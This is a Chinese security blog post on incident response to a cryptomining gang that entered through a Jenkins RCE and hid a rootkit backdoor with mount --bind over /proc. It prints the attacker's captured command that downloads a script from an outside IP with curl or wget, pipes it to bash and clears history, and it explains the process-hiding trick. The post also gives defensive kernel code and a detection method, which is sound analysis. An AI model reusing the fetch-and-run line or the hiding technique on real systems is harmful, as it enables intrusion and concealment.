---
title: 0889挖矿团伙rootkit后门溯源排查记录
url: https://zgao.top/0889%e6%8c%96%e7%9f%bf%e5%9b%a2%e4%bc%99rootkit%e5%90%8e%e9%97%a8%e6%ba%af%e6%ba%90%e6%8e%92%e6%9f%a5%e8%ae%b0%e5%bd%95/
source: Zgao's blog
date: 2025-01-21
fetch_date: 2025-10-06T20:08:49.798796
---

# 0889挖矿团伙rootkit后门溯源排查记录

# [Zgao's blog](https://zgao.top/)

愿有一日，安全圈的师傅们都能用上Zgao写的工具。

Toggle navigation

* [工具箱](https://zgao.top/tool/)
* [文章归档](https://zgao.top/archives/)
* [关于我](https://zgao.top/about-me/)
* [github](https://github.com/zgao264)
* Gmail

# 0889挖矿团伙rootkit后门溯源排查记录

* [首页](https://zgao.top)
* [0889挖矿团伙rootkit后门溯源排查记录](https://zgao.top:443/0889%E6%8C%96%E7%9F%BF%E5%9B%A2%E4%BC%99rootkit%E5%90%8E%E9%97%A8%E6%BA%AF%E6%BA%90%E6%8E%92%E6%9F%A5%E8%AE%B0%E5%BD%95/)

[1月 20, 2025](https://zgao.top/2025/01/)

### 0889挖矿团伙rootkit后门溯源排查记录

作者 [Zgao](https://zgao.top/author/zgao/)
在[[应急响应](https://zgao.top/category/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/)](https://zgao.top/0889%E6%8C%96%E7%9F%BF%E5%9B%A2%E4%BC%99rootkit%E5%90%8E%E9%97%A8%E6%BA%AF%E6%BA%90%E6%8E%92%E6%9F%A5%E8%AE%B0%E5%BD%95/)

近期发现某国内的黑客团伙用0889.org作为恶意样本地址和通信域名，后面简称0889组织。最近一次排查某云上挖矿的case，发现该组织通过jenkins RCE漏洞突破边界，内网横向后拿到主机权限后，批量下发挖矿和rootkit后门。

![](https://zgao.top/wp-content/uploads/2025/01/image-2-1024x645.png)

挖矿就没什么好说的，本文重点分析该组织的rootkit后门隐藏手法以及应急排查思路。

文章目录

[ ]

* [Jenkins RCE漏洞突破边界](#Jenkins_RCE%E6%BC%8F%E6%B4%9E%E7%AA%81%E7%A0%B4%E8%BE%B9%E7%95%8C "Jenkins RCE漏洞突破边界")
* [内网横向扫描](#%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E6%89%AB%E6%8F%8F "内网横向扫描")
* [修改计划任务](#%E4%BF%AE%E6%94%B9%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1 "修改计划任务")
* [下发挖矿程序](#%E4%B8%8B%E5%8F%91%E6%8C%96%E7%9F%BF%E7%A8%8B%E5%BA%8F "下发挖矿程序")
* [rootkit后门排查](#rootkit%E5%90%8E%E9%97%A8%E6%8E%92%E6%9F%A5 "rootkit后门排查")
  + [内核DNS监控定位后门进程PID](#%E5%86%85%E6%A0%B8DNS%E7%9B%91%E6%8E%A7%E5%AE%9A%E4%BD%8D%E5%90%8E%E9%97%A8%E8%BF%9B%E7%A8%8BPID "内核DNS监控定位后门进程PID")
  + [内核层hook快速定位后门进程PID](#%E5%86%85%E6%A0%B8%E5%B1%82hook%E5%BF%AB%E9%80%9F%E5%AE%9A%E4%BD%8D%E5%90%8E%E9%97%A8%E8%BF%9B%E7%A8%8BPID "内核层hook快速定位后门进程PID")
* [样本分析](#%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90 "样本分析")
  + [mount –bind 挂载隐藏进程](#mount_%E2%80%93bind_%E6%8C%82%E8%BD%BD%E9%9A%90%E8%97%8F%E8%BF%9B%E7%A8%8B "mount –bind 挂载隐藏进程")
* [总结](#%E6%80%BB%E7%BB%93 "总结")

## Jenkins RCE漏洞突破边界

![](https://zgao.top/wp-content/uploads/2025/01/image-3-1024x708.png)

在主机安全的控制台，已经成功捕获攻击者初始的payload。

![](https://zgao.top/wp-content/uploads/2025/01/image-4-1024x709.png)

利用Jenkins远程代码执行的漏洞，下载初始恶意脚本并执行。通过网络攻击的payload能够关联到主机上的执行的进程链，说明该主机已经失陷。

## 内网横向扫描

通过对Jenkins服务器历史执行命令的审计。

![](https://zgao.top/wp-content/uploads/2025/01/image-5-1024x570.png)

定位主机最早的失陷时间为2024-10-13。

![](https://zgao.top/wp-content/uploads/2025/01/image-6-1024x539.png)

## 修改计划任务

![](https://zgao.top/wp-content/uploads/2025/01/image-7-1024x601.png)

对应的1.sh内容如下。计划任务的内容就是每隔5分钟，自动下载恶意脚本执行。

![](https://zgao.top/wp-content/uploads/2025/01/image-8-1024x661.png)

分析该域名下的多个恶意文件，shell脚本都带有清晰的注释，推测均为chatGPT等大模型编写的脚本。

## 下发挖矿程序

![](https://zgao.top/wp-content/uploads/2025/01/image-9-1024x505.png)

到这里上面的所有操作都属于常规入侵，但是当我们清理挖矿后，第二天的凌晨，内网所有主机的 /etc/crontab 文件又被修改加入了之前的恶意命令。所以主机上必定还存在后门进程，或者是黑客添加的后门守护进程。

## rootkit后门排查

由于黑客在主机上，修改过多个系统命令文件。在没有分析样本的情况下，一开始无法确定具体的后门进程文件。

![](https://zgao.top/wp-content/uploads/2025/01/企业微信截图_d64b35bd-4b0d-4fb6-a1d6-214c52368c93-1024x622.png)

主机安全上有监控系统的计划任务文件。分析进程树发现，父进程是bash，执行的命令为：

```
sh -c (curl -fsSL 8.210.186.110/script/1.sh || wget -q -O - 8.210.186.110/script/1.sh) | bash -s 3;history -c
 > /dev/null 2>&1
```

但是主机安全无法记录到curl命令的父进程，也就是不知道是谁调用了curl下载执行shell脚本重新修改cron计划任务文件。而这个父进程就是大概率就是隐藏的后门进程。

![](https://zgao.top/wp-content/uploads/2025/01/image-10-1024x629.png)

同时在主机安全下发的恶意域名请求监控，也无法定位到具体发起的进程以及PID。

通过busybox的ps和netstat命令同样没有发现任何异常外连，以及可疑的进程。

从上面的特征分析，隐藏的后门进程不是在应用层的劫持，而是在内核层。

### 内核DNS监控定位后门进程PID

> [开发ko内核模块，无依赖实现监控DNS请求进程](https://zgao.top/%E5%BC%80%E5%8F%91ko%E5%86%85%E6%A0%B8%E6%A8%A1%E5%9D%97%EF%BC%8C%E6%97%A0%E4%BE%9D%E8%B5%96%E5%AE%9E%E7%8E%B0%E7%9B%91%E6%8E%A7dns%E8%AF%B7%E6%B1%82%E8%BF%9B%E7%A8%8B/)

在以往的应急响应过程中，监控发起恶意DNS请求的PID相对复杂。大部分已有的实践思路都是通过ebpf和systemtap在内核层hook。但是客户的机器环境通常非常复杂，所以去年我有针对性开发了ko内核模块，只需要每次手动在客户的机器上编译加载到内核执行即可。

![](https://zgao.top/wp-content/uploads/2025/01/image-11-1024x734.png)

但是如果我们已经知道了对应隐藏进程的PID，是可以进到该进程的目录下的。

![](https://zgao.top/wp-content/uploads/2025/01/image-12-1024x666.png)

### 内核层hook快速定位后门进程PID

既然已经知道只能在内核层才能定位到后门进程的PID，所有就没有必要在所有主机上进行DNS内核抓包。抓包属于被动定位，如果后门进程没有触发请求，就无法快速定位。

更优的方案是直接加载一个新的ko模块，直接在内核层打印出所有运行进程的PID。核心的代码逻辑如下：

```
static void print_process_info(void) {
    struct task_struct *task;
    int process_count = 0;
    char *path_buf;  // 改为指针

    // 动态分配内存
    path_buf = kmalloc(PATH_MAX, GFP_KERNEL);
    if (!path_buf) {
        printk(KERN_ERR "Failed to allocate memory for path buffer\n");
        return;
    }

    printk(KERN_INFO "================ Process List Start ================\n");
    printk(KERN_INFO "FORMAT: [PID] PROCESS_NAME STATE PPID\n");
    printk(KERN_INFO "        exe -> PATH\n");

    for_each_process(task) {
        char *state_str;

        printk(KERN_INFO "[%d] %s State:%s PPID:%d\n",
               task->pid,
               task->comm,
               state_str,
               task->parent->pid);

        get_process_path(task, path_buf, PATH_MAX);
        if (path_buf[0] != '\0') {
            check_deleted_file(task, path_buf, PATH_MAX);
            printk(KERN_INFO "        exe -> %s\n", path_buf);
        }

        if (task->group_leader == task && !list_empty(&task->thread_group)) {
            struct task_struct *thread;
            list_for_each_entry(thread, &task->thread_group, thread_group) {
                if (thread != task) {
                    printk(KERN_INFO "  |-[%d] %s (thread of %d)\n",
                           thread->pid,
                           thread->comm,
                           task->pid);
                    get_process_path(thread, path_buf, PATH_MAX);
                    if (path_buf[0] != '\0') {
                        check_deleted_file(thread, path_buf, PATH_MAX);
                        printk(KERN_INFO "        exe -> %s\n", path_buf);
                    }
                }
            }
        }

        process_count++;
    }

    printk(KERN_INFO "Total number of processes: %d\n", process_count);
    printk(KERN_INFO "================ Process List End ================\n");

    // 释放内存
    kfree(path_buf);
}
```

![](https://zgao.top/wp-content/uploads/2025/01/image-15-1024x435.png)
![](https://zgao.top/wp-content/uploads/2025/01/image-16-1024x500.png)

通过ansible批量下发就能快速定位每台机器上的rootkit后门进程PID，直接kill进程PID即可。但是对于植入rootkit机器的清理方案，最佳实践还是建议重装系统。

## 样本分析

![](https://zgao.top/wp-content/uploads/2025/01/image-13-1024x635.png)

提取后门进程的文件到微步沙箱分析，到目前为止还是绿的。

![](https://zgao.top/wp-content/uploads/2025/01/image-14-1024x682.png)

但是行为分析中，确实能发现样本回连的域名信息。

### mount –bind 挂载隐藏进程

通过分析样本发现，进程隐藏是在mcron另一个前置的恶意程序中实现的。

![](https://zgao.top/wp-content/uploads/2025/01/image-17-1024x629.png)

mount –bind 的正常用途：

```
mount --bind /source /target  # 将 source 目录挂载到 target 目录
```

这会使得访问 /target 时实际看到的是 /source 的内容。

而恶意程序中`mount --bind` 挂载 /proc 目录的主要作用是隐藏真实进程信息。

```
mount --bind %s /proc/%d  # %s 可能是一个空目录或者伪造的进程信息
```

覆盖原有的进程目录内容，使得系统工具（ps、top、netstat等）看不到真实的进程信息，但进程实际还在运行，只是被”遮盖”了。

/proc 是一个虚拟文件系统，动态显示进程信息。mount –bind 可以覆盖原有的挂载点 即使原始的 /proc 条目被遮盖，进程依然能继续运行 系统工具依赖 /proc 来获取进程信息，所以会被欺骗。

对应检测的方式为：

```
mount | grep proc
```

![](https://zgao.top/wp-content/uploads/2025/01/image-18-1024x350.png)
![](https://zgao.top/wp-content/uploads/2025/01/image-20-1024x450.png)

然后正常kill即可。

## 总结

从最近多次应急案例来看，黑灰产的样本基本上都是大模型AI自动生成的。安全对抗已经逐渐从人与人的对抗，上升到大模型AI之间的对抗了。

Post Views: 1,147

赞赏

![](https://zgao.top/wp-content/uploads/2022/02/QQ图片20201028114105.jpeg)微信赞赏![](https://zgao.top/wp-content/uploads/2022/02/QQ图片20201028114100.jpeg)支付宝赞赏

###### Zgao

愿有一日，安全圈的师傅们都能用上Zgao写的工具。

### 7条评论

###### 匿名 发布于11:17 下午 - 2月 18, 2025

厉害呀大佬

[回复](https://zgao.top/0889%E6%8C%96%E7%9F%BF%E5%9B%A2%E4%BC%99rootkit%E5%90%8E%E9%97%A8%E6%BA%AF%E6%BA%90%E6%8E%92%E6%9F%A5%E8%AE%B0%E5%BD%95/?replytocom=9338#respond)

###### cx 发布于4:27 下午 - 2月 11, 2025

请教个问题：
mount –bind /source /target # 将 source 目录挂载到 target 目录
这会使得访问 /target 时实际看到的是 /source 的内容
为何访问/proc/pid还是能看到真实/target的内容而不是/source？

[回复](https://zgao.top...